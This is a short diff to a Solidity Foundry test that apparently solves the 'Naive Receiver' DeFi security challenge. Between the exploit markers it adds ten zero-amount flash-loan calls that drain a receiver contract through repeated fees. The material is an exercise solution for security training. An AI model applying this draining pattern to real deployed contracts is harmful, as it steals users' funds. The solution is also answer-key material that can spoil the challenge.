@@ -48,6 +48,16 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
 
         /**
          * EXPLOIT END *
